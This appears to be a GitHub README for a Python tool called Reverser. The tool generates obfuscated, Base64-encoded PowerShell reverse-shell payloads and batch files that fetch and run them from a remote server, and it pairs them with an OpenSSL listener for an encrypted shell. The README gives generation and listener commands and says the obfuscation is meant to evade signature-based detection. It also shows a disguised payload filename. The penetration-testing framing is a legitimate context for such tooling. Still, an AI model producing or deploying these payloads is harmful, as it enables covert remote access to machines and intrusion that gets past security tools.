# Reverser: Reverse Shell Generator with SSL Encryption

## Overview

**Reverse** is a Python-based tool designed to generate obfuscated PowerShell scripts or batch files for establishing a reverse shell with SSL encryption. This tool can help in penetration testing scenarios where the goal is to bypass security mechanisms and establish a secure connection to a target machine.

## Features

- **Reverse Shell with SSL Encryption:** Generates PowerShell scripts that establish an encrypted reverse shell connection using SSL.
- **Obfuscation:** Each generated PowerShell script uses randomly selected variable names to avoid signature-based detection by security tools.
- **Base64 Encoding:** The PowerShell scripts are encoded in Base64 for additional obfuscation.
- **Batch File Generation:** Create a batch file that downloads and executes the encoded PowerShell script directly from a remote server.
- **Customizable:** Users can specify the IP address, port, and server URL for downloading the PowerShell script.

### Prerequisites

- Python 3.x
- OpenSSL (for certificate generation)

### Installation

Clone the repository:

```bash
git clone https://github.com/ShkudW/Reverser.git
cd Reception
```

## Usage

The tool can generate two types of files, as chosen by the user:
A PS1 file with obfuscation and Base64 encoding containing a Reverse shell payload.
A legitimate BAT file that connects to a remote server to download the encoded PS1 file.

To create the BAT file, I developed a Python script that acts as a listener for the PS1 file download request. The server can operate with an encryption certificate and supports connections over both HTTP and HTTPS. This ensures that the initial connection between the BAT file and the server for downloading the payload is conducted over an encrypted channel.

The encoded PS1 file will be loaded into memory and establish a connection to another listener, which is set up using OpenSSL.

This way, we can ensure that the communication is encrypted end-to-end.
---------------------------

Creating only a PS1 file (obfuscated and Based64 encoded):
```bash
python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type ps1
```

Creating a BAT file with the tool and transferring it to the listener's directory:
```bash
python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type bat -server https://<Your_Listener_Server_IP_For_Downloadin_PS1/welcome.pdf.ine.co.il.ps1>
```
![image](https://github.com/user-attachments/assets/350a0105-c8a3-43f5-8e67-fddb34cf84f8)



Opening a listener with the OpenSSL server to receive the Reverse shell connection, 
and opening a listener with our server to handle the initial connection for downloading the PS1 file from the BAT file:
```bash
openssl s_server -accept <Your_PORT> -cert reception.pem -key reception.key -quiet
```
```bash
python3 listener.py -https_port <Your_Listener_Server_PORT>
```
![image](https://github.com/user-attachments/assets/b64a4bf1-e801-4a3e-8a0b-eaa1acbd9ff8)



Running the BAT file on the workstation, the file connects to our listener server over encrypted traffic:

![image](https://github.com/user-attachments/assets/049f45bf-f014-47d8-92ef-4514294745cf)




Receiving a response from the listener server and establishing a Reverse shell from the workstation:

![image](https://github.com/user-attachments/assets/dee0bf16-68f4-4059-9bdf-3d28e859e4c5)



The encrypted network traffic:

![image](https://github.com/user-attachments/assets/7fa8673f-0d4c-40e5-9449-ef746b6b203f)



And here is an example for those who want to create an encrypted listener server. 
The BAT file will connect to the server to download the PS1 file, and you can observe the connection to the server. 
The Reverse shell operation will then proceed in an encrypted manner:
![image](https://github.com/user-attachments/assets/77b78ae6-fc92-4fa9-93fa-ab43a9bc5b27)




